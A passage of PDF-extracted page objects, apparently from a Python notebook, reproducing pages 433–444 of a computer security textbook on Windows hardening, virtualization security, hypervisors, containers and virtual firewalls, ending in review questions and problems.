(SID). This \\ninformation may be stored and used locally, on a single system, in the Security \\nAccount Manager (SAM). It may also be centrally managed for a group of systems \\nbelonging to a domain, with the information supplied by a central Active Directory \\nM12_STAL0611_04_GE_C12.indd   433 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 435, 'page_label': '434'}, page_content='434  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\n(AD) system using the LDAP protocol. Most organizations with multiple systems \\nwill manage them using domains. These systems can also enforce common policy \\non users on any system in the domain. We will further explore the Windows security \\narchitecture in Section 26.1.\\nWindows systems implement discretionary access controls to system resources \\nsuch as files, shared memory, and named pipes. The access control list has a number \\nof entries that may grant or deny access rights to a specific SID, which may be for \\nan individual user or for some group of users. Windows Vista and later systems also \\ninclude mandatory integrity controls. These label all objects, such as processes and \\nfiles, and all users, as being of low, medium, high, or system integrity level. Then when-\\never data is written to an object, the system first ensures that the subject’s integrity is \\nequal or higher than the object’s level. This implements a form of the Biba Integrity \\nmodel we will discuss in Section 2 7.2 that specifically targets the issue of untrusted \\nremote code executing in, for example Windows Internet Explorer, trying to modify \\nlocal resources.\\nWindows systems also define privileges, which are system wide and granted \\nto user accounts. Examples of privileges include the ability to backup the computer \\n(which requires overriding the normal access controls to obtain a complete backup), \\nor the ability to change the system time. Some privileges are considered dangerous, \\nas an attacker may use them to damage the system. Hence, they must be granted with \\ncare. Others are regarded as benign, and may be granted to many or all user accounts.\\nAs with any system, hardening the system configuration can include further \\nlimiting the rights and privileges granted to users and groups on the system. As the \\naccess control list gives deny entries greater precedence, you can set an explicit deny \\npermission to prevent unauthorized access to some resource, even if the user is a \\nmember of a group that otherwise grants access.\\nWhen accessing files on a shared resource, a combination of share and NTFS \\npermissions may be used to provide additional security and granularity. For example, \\nyou can grant full control to a share, but read-only access to the files within it. If \\naccess-based enumeration is enabled on shared resources, it can automatically hide \\nany objects that a user is not permitted to read. This is useful with shared folders \\ncontaining many users’ home directories, for example.\\nYou should also ensure users with administrative rights only use them when \\nrequired, and otherwise access the system as a normal user. The User Account Con-\\ntrol (UAC) provided in Vista and later systems assists with this requirement. These \\nsystems also provide Low Privilege Service Accounts that may be used for long-lived \\nservice processes, such as file, print, and DNS services that do not require elevated \\nprivileges.\\nApplication and Service Configuration\\nUnlike Unix and Linux systems, much of the configuration information in Windows \\nsystems is centralized in the Registry, which forms a database of keys and values that \\nmay be queried and interpreted by applications on these systems.\\nChanges to these values can be made within specific applications, setting prefer-\\nences in the application that are then saved in the registry using the appropriate keys \\nand values. This approach hides the detailed representation from the administrator. \\nM12_STAL0611_04_GE_C12.indd   434 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 436, 'page_label': '435'}, page_content='12.8 / ViRTuALiZATiOn SECuRiTy  435\\nAlternatively, the registry keys can be directly modified using the “Registry Editor.” \\nThis approach is more useful for making bulk changes, such as those recommended \\nin hardening guides. These changes may also be recorded in a central repository, and \\npushed out whenever a user logs in to a system within a network domain.\\nOther Security Controls\\nGiven the predominance of malware that targets Windows systems, it is essential \\nthat suitable anti-virus, anti-spyware, personal firewall, and other malware and attack \\ndetection and handling software packages are installed and configured on such \\n systems. This is clearly needed for network connected systems, as shown by the high-\\nincidence numbers in reports such as [SYMA16]. However, as the Stuxnet attacks \\nin 2010 show, even isolated systems updated using removable media are vulnerable, \\nand thus must also be protected.\\nCurrent generation Windows systems include some basic firewall and mal -\\nware countermeasure capabilities, which should certainly be used at a minimum. \\nHowever, many organizations find that these should be augmented with one or \\nmore of the many commercial products available. One issue of concern is undesir -\\nable interactions between anti-virus and other products from multiple vendors. \\nCare is needed when planning and installing such products to identify possible \\nadverse interactions, and to ensure the set of products in use are compatible with \\neach other.\\nWindows systems also support a range of cryptographic functions that may \\nbe used where desirable. These include support for encrypting files and directories \\nusing the Encrypting File System (EFS), and for full-disk encryption with AES using \\nBitLocker.\\nSecurity Testing\\nThe system hardening guides such as those provided by the “NSA—Security \\nConfiguration Guides” also include security checklists for various versions of \\nWindows.\\nThere are also a number of commercial and open-source tools available to \\nperform system security scanning and vulnerability testing of Windows systems. The \\n“Microsoft Baseline Security Analyzer” is a simple, free, easy-to-use tool that aims \\nto help small- to medium-sized businesses improve the security of their systems by \\nchecking for compliance with Microsoft’s security recommendations. Larger orga -\\nnizations are likely better served using one of the larger, centralized, commercial \\nsecurity analysis suites available.\\n 12.8 VIRTUALIZATION SECURITY\\nVirtualization refers to a technology that provides an abstraction of the computing \\nresources used by some software, which thus runs in a simulated environment called a \\nvirtual machine (VM). There are many types of virtualization; however, in this section \\nwe are most interested in full virtualization. This allows multiple full operating system \\ninstances to execute on virtual hardware, supported by a hypervisor that manages \\nM12_STAL0611_04_GE_C12.indd   435 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 437, 'page_label': '436'}, page_content='436  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\naccess to the actual physical hardware resources. Benefits arising from using virtu -\\nalization include better efficiency in the use of the physical system resources than is \\ntypically seen using a single operating system instance. This is particularly evident in \\nthe provision of virtualized server systems. Virtualization can also provide support for \\nmultiple distinct operating systems and associated applications on the one physical \\nsystem. This is more commonly seen on client systems.\\nThere are a number of additional security concerns raised in virtualized systems, \\nas a consequence both of the multiple operating systems executing side by side and \\nof the presence of the virtualized environment and hypervisor as a layer below the \\noperating system kernels and the security services they provide. [CLEE09] presents \\na survey of some of the security issues arising from such a use of virtualization, a \\nnumber of which we will discuss further.\\nVirtualization Alternatives\\nThe hypervisor is software that sits between the hardware and the VMs and acts as \\na resource broker. Simply put, it allows multiple VMs to safely coexist on a single \\nphysical server host and share that host’s resources. The virtualizing software provides \\nabstraction of all physical resources (such as processor, memory, network, and stor-\\nage) and thus enables multiple computing stacks, called virtual machines, to be run \\non a single physical host.\\nEach VM includes an OS, called the guest OS. This OS may be the same as the \\nhost OS, if present, or a different one. For example, a guest Windows OS could be run \\nin a VM on top of a Linux host OS. The guest OS, in turn, supports a set of standard \\nlibrary functions and other binary files and applications. From the point of view of the \\napplications and the user, this stack appears as an actual machine, with hardware and \\nan OS; thus the term virtual machine is appropriate. In other words, it is the hardware \\nthat is being virtualized.\\nThe principal functions performed by a hypervisor are the following:\\n• Execution management of VMs: Includes scheduling VMs for execution, virtual \\nmemory management to ensure VM isolation from other VMs, and context \\nswitching between various processor states. Also includes isolation of VMs \\nto prevent conflicts in resource usage and emulation of timer and interrupt \\nmechanisms.\\n• Devices emulation and access control : Emulating all network and storage \\n(block) devices that different native drivers in VMs are expecting, and mediat-\\ning access to physical devices by different VMs.\\n• Execution of privileged operations by hypervisor for guest VMs: Certain opera-\\ntions invoked by guest OSs, instead of being executed directly by the host hard-\\nware, may have to be executed on its behalf by the hypervisor, because of their \\nprivileged nature.\\n• Management of VMs (also called VM lifecycle management): Configuring guest \\nVMs and controlling VM states (e.g., Start, Pause, Stop). \\n• Administration of hypervisor platform and hypervisor software : Involves set-\\nting of parameters for user interactions with the hypervisor host as well as \\nhypervisor software.\\nM12_STAL0611_04_GE_C12.indd   436 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 438, 'page_label': '437'}, page_content='12.8 / ViRTuALiZATiOn SECuRiTy  437\\nType 1 Hypervisor There are two types of hypervisors, distinguished by whether \\nthere is an OS between the hypervisor and the host. A type 1 hypervisor  (see \\n Figure\\xa012.2a) is loaded as a software layer directly onto a physical server, much like \\nan OS is loaded; this is referred to as native virtualization. The type 1 hypervisor can \\ndirectly control the physical resources of the host. Once it is installed and configured, \\nthe server is then capable of supporting virtual machines as guests. In mature envi -\\nronments, where virtualization hosts are clustered together for increased availability \\nand load balancing, a hypervisor can be staged on a new host. Then, that new host \\nis joined to an existing cluster, and VMs can be moved to the new host without any \\ninterruption of service.\\nType 2 Hypervisor A type 2 hypervisor exploits the resources and functions of a \\nhost OS and runs as a software module on top of the OS (see Figure 12.2b); this is \\nreferred to as hosted virtualization. It relies on the OS to handle all of the hardware \\ninteractions on the hypervisor’s behalf.\\nKey differences between the two hypervisor types are as follows:\\n• Typically, type 1 hypervisors perform better than type 2 hypervisors. Because \\na Type 1 hypervisor doesn’t compete for resources with an OS, there are more \\nresources available on the host, and by extension, more virtual machines can be \\nhosted on a virtualization server using a Type 1 hypervisor.\\n• Type 1 hypervisors are also considered to be more secure than the Type 2 hyper-\\nvisors. Virtual machines on a Type 1 hypervisor make resource requests that \\nare handled external to that guest, and they cannot affect other VMs or the \\nFigure 12.2 Comparison of Virtual Machines and Containers\\n(a) Type 1 hypervisor\\n(native virtualization)\\nHardware\\nHypervisor\\nGuest OS Guest OS\\nlibraries\\nVirtual machine\\nlibraries\\nApp App App App\\nHardware\\nContainer Engine\\nHost OS\\nlibraries libraries\\nApp App App App\\n(c) Container (application virtualization)\\n(b) Type 2 hypervisor\\n(hosted virtualization)\\nHardware\\nHypervisor\\nHost OS\\nGuest OS Guest OS\\nlibraries\\nVirtual machine\\nlibraries\\nApp App App App\\nContainer\\nContainer\\nM12_STAL0611_04_GE_C12.indd   437 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 439, 'page_label': '438'}, page_content='438  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nhypervisor they are supported by. This is not necessarily true for VMs on a Type \\n2 hypervisor and a malicious guest could potentially affect more than itself.\\n• Type 2 hypervisors allow a user to tak e advantage of virtualization without \\nneeding to dedicate a server to only that function. Developers who need to \\nrun multiple environments as part of their process, in addition to taking advan-\\ntage of the personal productive workspace that a PC OS provides, can do both \\nwith a type 2 hypervisor installed as an application on their LINUX, MacOSX, \\nor  Windows desktop. The virtual machines that are created and used can be \\nmigrated or copied from one hypervisor environment to another, reducing \\ndeployment time and increasing the accuracy of what is deployed, and reduc -\\ning the time to market a project.\\nNative virtualization  systems are typically seen in servers, with the goal of \\nimproving the execution efficiency of the hardware. They are arguably also more \\nsecure, as they have fewer additional layers than the alternative hosted approach. \\nHosted virtualization systems are more common in clients, where they run alongside \\nother applications on the host OS, and are used to support applications for alternate \\noperating system versions or types.\\nIn virtualized systems, the available hardware resources must be appropriately \\nshared among the various guest OS’s. These include CPU, memory, disk, network, \\nand other attached devices. CPU and memory are generally partitioned between \\nthese, and scheduled as required. Disk storage may be partitioned, with each guest \\nhaving exclusive use of some disk resources. Alternatively, a “virtual disk” may be \\ncreated for each guest, which appears to it as a physical disk with a full file-system, \\nbut is viewed externally as a single “disk image” file on the underlying file-system. \\nAttached devices such as optical disks, or USB devices are generally allocated to a \\nsingle guest OS at a time.\\nSeveral alternatives exist for providing network access. The guest OS may have \\ndirect access to distinct network interface cards on the system; the hypervisor may \\nmediate access to shared interfaces; or the hypervisor may implement virtual network \\ninterface cards for each guest, bridging or routing traffic between guests as required. \\nThis last approach uses one or more virtual network switches, which are imple -\\nmented in the hypervisor kernel, and is quite common. It is arguably the most effi -\\ncient approach, since traffic between guests does not need to be relayed via external \\nnetwork links. It does have security consequences in that this traffic is not subject to \\nmonitoring by probes attached to physical networks, such as we discussed in Chapter 9.\\nWhen a number virtualized systems and hypervisors are grouped together in \\na data center, or even between data centers, the various systems need to connect \\nto appropriate network segments, with suitable routing and firewalls connecting \\nthem together, and to the Internet. The cloud computing solutions we will discuss in \\n Chapter\\xa013 use this structure, as do computing solutions for some large organizations. \\nThe network connections can be made with physical, external, links, using IDS and \\nfirewalls to link them together as we discussed in Chapters 8 and 9. However this \\napproach limits the flexibility of the virtualized solution, as virtual machines can only \\nbe migrated to other hosts with the required physical network connections already \\nin place. VLANs can provide more flexibility in the network architecture, though \\nare still limited by the physical network connections and VLAN configuration. \\nM12_STAL0611_04_GE_C12.indd   438 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 440, 'page_label': '439'}, page_content='12.8 / ViRTuALiZATiOn SECuRiTy  439\\nGreater flexibility still is provided by software defined networks  (SDNs), which \\nenable network segments to logically span multiple servers within and between data \\ncenters, while using the same underlying physical network. There are several pos -\\nsible approaches to providing SDNs, including the use of overlay networks. These \\nabstract all layer 2 and 3 addresses from the underlying physical network into what-\\never logical network structure is required. And this structure can be easily changed \\nand extended as needed. The IETF standard DOVE (Distributed Overlay Virtual \\nNetwork), which uses VXLAN (Virtual Extended Local Area Network) can be used \\nto implement such an overlay network. With this flexible structure, it is possible to \\nlocate virtual servers, virtual IDS, and virtual firewalls anywhere within the network \\nas required. We further discuss the use of secure virtual networks and firewalls later \\nin this section.\\nConTainers A relatively recent approach to virtualization, known as container \\nvirtualization or application virtualization, is worth noting (see Figure 12.2c). In this \\napproach, software, known as a virtualization container, runs on top of the host OS \\nkernel and provides an isolated execution environment for applications. Unlike hyper-\\nvisor-based VMs, containers do not aim to emulate physical servers. Instead, all contain-\\nerized applications on a host share a common OS kernel. This eliminates the resources \\nneeded to run a separate OS for each application and can greatly reduce overhead.\\nFor containers, only a small container engine is required as support for the \\ncontainers. The container engine sets up each container as an isolated instance by \\nrequesting dedicated resources from the OS for each container. Each container app \\nthen directly uses the resources of the host OS. VM virtualization functions at the \\nborder of hardware and OS. It’s able to provide strong performance isolation and \\nsecurity guarantees with the narrowed interface between VMs and hypervisors. \\n Containerization, which sits in between the OS and applications, incurs lower over-\\nhead, but potentially introduces greater security vulnerabilities.\\nVirtualization Security Issues\\n[CLEE09] and NIST SP 800-125 (Guide to Security for Full Virtualization Technolo-\\ngies, January 2011) both detail a number of security concerns that result from the use \\nof virtualized systems, including:\\n• Guest OS isolation, ensuring that programs executing within a guest OS may \\nonly access and use the resources allocated to it, and not covertly interact with \\nprograms or data either in other guest OSs or in the hypervisor.\\n• Guest OS monitoring by the hypervisor, which has privileged access to the pro-\\ngrams and data in each guest OS, and must be trusted as secure from subversion \\nand compromised use of this access.\\n• Virtualized en vironment security, particularly image and snapshot manage -\\nment, which attackers may attempt to view or modify.\\nThese security concerns may be regarded as an extension of the concerns we have \\nalready discussed with securing operating systems and applications. If a particular \\noperating system and application configuration is vulnerable when running directly \\non hardware in some context, it will most likely also be vulnerable when running \\nM12_STAL0611_04_GE_C12.indd   439 10/11/17   3:02 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 441, 'page_label': '440'}, page_content='440  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nin a virtualized environment. And should that system actually be compromised, \\nit would be at least as capable of attacking other nearby systems, whether they \\nare also executing directly on hardware or running as other guests in a virtual -\\nized environment. The use of a virtualized environment may improve security by \\nfurther isolating network traffic between guests than would be the case when such \\nsystems run natively, however this traffic is not visible to external IDS or firewall \\nsystems, and may require the use of virtual firewalls to manage. Further the ability \\nof the hypervisor to transparently monitor activity on all guests OS may be used as \\na form of virtual firewall or IDS to assist in securing these systems. However, the \\npresence of the virtualized environment and the hypervisor may reduce security \\nif vulnerabilities exist within it which attackers may exploit. Such vulnerabilities \\ncould allow programs executing in a guest to covertly access the hypervisor, and \\nhence other guest OS resources. This is known as VM escape, and is of concern, as \\nwe discussed in Section 6.8. Virtualized systems also often provide support for sus -\\npending an executing guest OS in a snapshot, saving that image, and then restarting \\nexecution at a later time, possibly even on another system. If an attacker can view \\nor modify this image, they can compromise the security of the data and programs \\ncontained within it. The use of infrastructure with many virtualized systems within \\nand between data centers, linked using software-defined networks, raise further \\nsecurity concerns.\\nThus, the use of virtualization adds additional layers of concern, as we have \\npreviously noted. Securing virtualized systems means extending the security pro -\\ncess to secure and harden these additional layers. In addition to securing each guest \\noperating system and applications, the virtualized environment and the hypervisor \\nmust also be secured.\\nSecuring Virtualization Systems\\nNIST SP 800-125 provides guidance for providing appropriate security in virtualized \\n systems, and states that organizations using virtualization should:\\n• Carefully plan the security of the virtualized system.\\n• Secure all elements of a full virtualization solution,  including the hypervisor, \\nguest OSs, and virtualized infrastructure, and maintain their security.\\n• Ensure that the hypervisor is properly secured.\\n• Restrict and protect administrator access to the virtualization solution.\\nThis is clearly seen as an extension of the process of securing systems that we pre -\\nsented earlier in this chapter.\\nHypervisor seCuriTy The hypervisor should be secured using a process similar to \\nthat with securing an oper ating system. That is, it should be installed in an isolated \\nenvironment, from known clean media, and updated to the latest patch level in \\norder to minimize the number of vulnerabilities that may be present. It should then \\nbe configured so that it is updated automatically, any unused services are disabled \\nor removed, unused hardware is disconnected, appropriate introspection capabili -\\nties are used with the guest OSs, and the hypervisor is monitored for any signs of \\ncompromise.\\nM12_STAL0611_04_GE_C12.indd   440 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 442, 'page_label': '441'}, page_content='12.8 / ViRTuALiZATiOn SECuRiTy  441\\nAccess to the hypervisor should be limited to authorized administrators only, \\nsince these users would be capable of accessing and monitoring activity in any of the \\nguest OSs. The hypervisor may support both local and remote administration. This \\nmust be configured appropriately, with suitable authentication and encryption mech-\\nanisms used, particularly when using remote administration. Remote administration \\naccess should also be considered and secured in the design of any network firewall \\nand IDS capability in use. Ideally such administration traffic should use a separate \\nnetwork, with very limited, if any, access provided from outside the organization.\\nVirtualized Infrastructure Security\\nThe wider virtualization infrastructure must be carefully managed and configured. \\nVirtualized system hypervisors manage access to hardware resources such as disk \\nstorage and network interfaces. This access must be limited to just the appropriate \\nguest OSs that use any resource, and network connections suitably arranged. Access \\nto VM images and snapshots must also be carefully controlled, since these are another \\npotential point of attack.\\nWhen multiple virtualized systems are used, NIST SP 800-125B (Secure Virtual \\nNetwork Configuration for Virtual Machine (VM) Protection, March 2016) notes three \\ndistinct categories of network traffic:\\n• Management traffic: used for hypervisor administration and configuration of \\nthe virtualized infrastructure.\\n• Infrastructure traffic: such as migration of VM images, or connections to net -\\nwork storage technologies.\\n• Application traffic : between applications running VMs and to external net -\\nworks. This traffic may be further separated into a number of segments, isolat-\\ning traffic from applications with different sensitivity levels, or from different \\norganizations or departments.\\nTraffic in each of these should be suitably isolated and protected. This requires the \\nuse of a number of network segments, connected as needed by appropriate firewall \\nsystems. These may variously use a combination of distinct physical network connec-\\ntions, VLANs, or software defined networks to provide a suitable network structure. \\nFor example, in larger installations, management and infrastructure traffic may use \\nrelatively static physical network connections, while the application traffic would \\nuse more flexible VLANs or software defined networks layered over a separate base \\nphysical network structure.\\nVirtual Firewall\\nAs we mentioned in Section 9.4, a Virtual Firewall provides firewall capabilities for \\nthe network traffic flowing between systems hosted in a virtualized or cloud envi -\\nronment that does not require this traffic to be routed out to a physically separate \\nnetwork supporting traditional firewall services. These capabilities may be provided \\nby a combination of:\\n• VM Bastion Host: Where a separate VM is used as a bastion host supporting \\nthe same firewall systems and services that could be configured to run on a \\nM12_STAL0611_04_GE_C12.indd   441 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 443, 'page_label': '442'}, page_content='442  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\nphysically separate bastion, including possibly IDS and IPS services. The net -\\nwork connections used by other VMs are configured to connect them to suitable \\nsub-networks. These are connected to distinct virtual network interfaces on the \\nVM Bastion Host, which can monitor and route traffic between them in the \\nsame manner, and with the same configuration possibilities, as on a physically \\nseparate bastion host. Such systems may be provided as a virtual UTM installed \\ninto a suitably hardened VM that can be easily loaded, configured, and run as \\nneeded. A disadvantage of this approach is that these virtual bastions compete \\nfor the same hypervisor host resources as other VMs on that system.\\n• VM Host-Based Firewall: Where host-based firewall capabilities provided by \\nthe Guest OS running on the VM are configured to secure that host in the same \\nmanner as used in physically separate systems.\\n• Hypervisor Firewall: Where firewall capabilities are provided directly by the \\nhypervisor. These capabilities range from stateless or stateful packet inspection \\nin the virtual network switches that forward network traffic between VMs, to \\na full hypervisor firewall capable of monitoring all activity within its VMs. This \\nlatter variant provides capabilities of both host-based and bastion host firewalls, \\nbut from a location outside the traditional host and network structure. It can \\nbe more secure than the other alternatives, as it is not part of the virtualized \\nnetwork, nor visible as a separate VM. It may also be more efficient than the \\nalternatives, since the resource monitoring and filtering occur within the hyper-\\nvisor kernel running directly on the hardware. However, it requires a hypervisor \\nthat supports these features, which also adds to its complexity.\\nWhen used in large-scale virtualized environments, with many virtualized systems \\nlinked with VLANs or software defined networks across one or more data centers, \\nvirtual firewall bastions can be provisioned and located as needed where suitable \\nresources are available. This provides a greater level of flexibility and scalability \\nthan many traditional structures can support. However, there may still be a need for \\nsome physical firewall systems, especially to support very high traffic volumes either \\nbetween virtual servers or on their connection to the wider Internet.\\nHosTed virTualizaTion seCuriTy Hosted virtualized systems, as typically used \\non client systems, pose some additional security concerns. These result from the pres-\\nence of the host OS under, and other host applications beside, the hypervisor and \\nits guest OSs. Hence there are yet more layers to secure. Further, the users of such \\nsystems often have full access to configure the hypervisor, and to any VM images and \\nsnapshots. In this case, the use of virtualization is more to provide additional features, \\nand to support multiple operating systems and applications, than to isolate these \\nsystems and data from each other, and from the users of these systems.\\nIt is possible to design a host system and virtualization solution that is more \\nprotected from access and modification by the users. This approach may be used to \\nsupport well-secured guest OS images used to provide access to enterprise networks \\nand data, and to support central administration and update of these images. However, \\nthere will remain security concerns from possible compromise of the underlying host \\nOS, unless it is adequately secured and managed.\\nM12_STAL0611_04_GE_C12.indd   442 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 444, 'page_label': '443'}, page_content='12.9 / KEy TERmS, REViEW QuESTiOnS, AnD PROBLEmS  443\\nReview Questions\\n 12.1 What are the basic steps needed in the process of securing a system?\\n 12.2 What is “hardening”?\\n 12.3 What are the basic steps needed to secure the base operating system?\\n 12.4 Why is keeping all software as up to date as possible so important?\\n 12.5 What are the pros and cons of automated patching?\\n 12.6 Why is it bet ter to not install software applications from unknown sources at all, \\ninstead of installing them, perhaps testing them, and then removing or disabling them?\\n 12.7 What types of additional security contr ols may be used to secure the base operating \\nsystem?\\n 12.8 What additional steps are used to secure key applications?\\n 12.9 What steps are used to maintain system security?\\n 12.10 Why is effective logging considered a cornerstone of sound security practice?\\n 12.11 What is the difference between a data backup and data archiving?\\n 12.12 Where is user account and group information stored in Unix systems?\\n 12.13 How does the Windows operating system provide patch management?\\n 12.14 What effect do set user and set group permissions have when executing files on Unix \\nand Linux systems?\\n 12.15 What is the main host firewall program used on Linux systems?\\n 12.16 What is meant by a tripwire?\\n 12.17 How is a chroot jail used to improve application security on Unix and Linux systems?\\n 12.18 Where are two places user and group information may be stored on Windows systems?\\n 12.19 What are the major differences between the implementations of the discretionary \\naccess control models on Unix and Linux systems and those on Windows systems?\\n 12.20 What are mandatory integrity controls used for in Windows systems?\\n 12.21 On Windows, which privilege overrides all ACL checks, and why?\\n 12.22 Where is application and service configuration information stored on Windows systems?\\n 12.23 What is a hypervisor?\\n 12.24 State different types of full virtualization with their security requirements.\\nKey Terms\\naccess controls\\nadministrators\\napplication virtualization\\narchive\\nbackup\\nchroot\\ncontainer virtualization\\nfull virtualization\\nguest OS\\nhardening\\nhosted virtualization\\nhypervisor\\nlogging\\nnative virtualization\\noverlay network\\npatches\\npatching\\npermissions\\nsoftware defined network\\ntype 1 hypervisor\\ntype 2 hypervisor\\nvirtualization\\n 12.9 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nM12_STAL0611_04_GE_C12.indd   443 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 445, 'page_label': '444'}, page_content='444  CHAPTER 12 / OPERATing SySTEm SECuRiTy\\n 12.25 What are the main security concerns with a hypervisor?\\n 12.26 What is VM escape and what are its implications?\\nProblems\\n 12.1 Describe the main reason for not eliminating the setuid root programs completely \\nfrom the operating systems.\\n 12.2 Set user (setuid) and set group (setgid) pr ograms and scripts are a powerful mecha -\\nnism provided by Unix to support “controlled invocation” to manage access to sensi-\\ntive resources. However, precisely because of this it is a potential security hole, and \\nbugs in such programs have led to many compromises on Unix systems. Detail a com-\\nmand you could use to locate all set user or group scripts and programs on a Unix \\nsystem, and how you might use this information.\\n 12.3 How can we use the TCP Wrappers and tcpd daemon to achieve secure remote con -\\ntrol access? What if the network servers are heavily loaded?\\n 12.4 Employee “david” owns a directory, “exams,” containing a text file called “papers.\\ntxt” that he shares with users belonging to the group “examiners.” Those users can \\nnot only read and change this file, but also delete it. They can add other files to the \\ndirectory. Others may neither read, write, nor execute anything in “examiners.” What \\nwould appropriate ownerships  and  permissions  for  both  the  directory “examiners”  \\nand  the  file “papers.txt”  look like? (Write your answers in the form of “long listing” \\noutput.)\\n 12.5 Suppose you operate an Apache-based Linux Web server that hosts your company’s \\ne-commerce site. Suppose further there is a worm called “WorminatorX,” which \\nexploits a (fictional) buffer overflow bug in the Apache Web server package that can \\nresult in a remote root compromise. Construct a simple threat model that describes \\nthe risk this represents: attacker(s), attack-vector, vulnerability, assets, likelihood of \\noccurrence, likely impact, and plausible mitigations.\\n 12.6 Why is it important to secure the boot process? Is it required to limit which media the \\nsystem must boot from?\\n 12.7 Consider an automated audit log analysis tool (e.g ., swatch). Can you propose some \\nrules which could be used to distinguish “suspicious activities” from normal user \\nbehavior on a system for some organization?\\n 12.8 Assume a hosted virtualization system in which a hypervisor executes and manages a \\ntotal of six guest operating systems. Suppose an external hard disk is attached to the \\nsystem and three guest operating systems need to access it for retrieving data. Will the \\nattached hard disk be allocated to all the three guest operating systems at the same \\ntime? Moreover, how will the hypervisor provide network access to the guest operat-\\ning systems if the total number of network 